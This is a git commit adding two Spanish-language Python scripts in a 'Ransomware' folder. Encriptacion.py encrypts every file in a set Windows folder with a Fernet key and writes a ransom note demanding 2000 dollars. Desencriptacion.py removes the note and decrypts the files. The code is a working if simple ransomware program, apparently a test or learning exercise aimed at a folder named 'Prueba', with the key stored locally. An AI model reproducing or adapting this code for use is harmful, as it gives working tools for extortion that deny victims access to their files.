6c066432bd5d192d121cd67c1ddf18a12ce5b68f
FrankHartling06 <86640221+FrankHartling06@users.noreply.github.com>
2022-11-21 18:35:36 -0400

    Add files via upload

---
+++ Ransomware/Desencriptacion.py
@@ -0,0 +1,24 @@
+from cryptography.fernet import Fernet
+import os
+
+def cargar_key():
+    return open('key.key', 'rb').read()
+
+def desencriptar(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as archivo:
+            datos_encriptados = archivo.read()
+        datos_desencriptados = f.decrypt(datos_encriptados)
+        with open(item, 'wb') as archivo:
+            archivo.write(datos_desencriptados)
+
+if __name__ == '__main__':
+    ruta_desencriptar = 'C:\\Users\\fedua\\OneDrive\\Documents\\Ransomware\\Prueba'
+    os.remove(ruta_desencriptar+'\\'+'readme.txt')
+
+    items = os.listdir(ruta_desencriptar)
+    ruta_completa = [ruta_desencriptar+'\\'+item for item in items]
+
+    key = cargar_key()
+    desencriptar(ruta_completa, key)
---
+++ Ransomware/Encriptacion.py
@@ -0,0 +1,34 @@
+from cryptography.fernet import Fernet
+import os
+
+def generar_key():
+    key = Fernet.generate_key()
+    with open('key.key', 'wb') as archivo_key:
+        archivo_key.write(key)
+
+def cargar_key():
+    return open('key.key', 'rb').read()
+
+def encriptar(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as archivo:
+            datos_archivo = archivo.read()
+        datos_encriptados = f.encrypt(datos_archivo)
+        with open(item, 'wb') as archivo:
+            archivo.write(datos_encriptados)
+
+if __name__ == '__main__':
+
+    ruta_encriptar = 'C:\\Users\\fedua\\OneDrive\\Documents\\Ransomware\\Prueba'
+    items = os.listdir(ruta_encriptar)
+    ruta_completa = [ruta_encriptar+ '\\'+item for item in items]
+
+    generar_key()
+    key = cargar_key()
+
+    encriptar(ruta_completa, key)
+
+    with open(ruta_encriptar+ '\\'+'readme.txt', 'w') as archivo:
+        archivo.write('Ficheros encriptados\n')
+        archivo.write('Depositame 2000 dolares en la cuenta para desencriptarte el archivo :)')
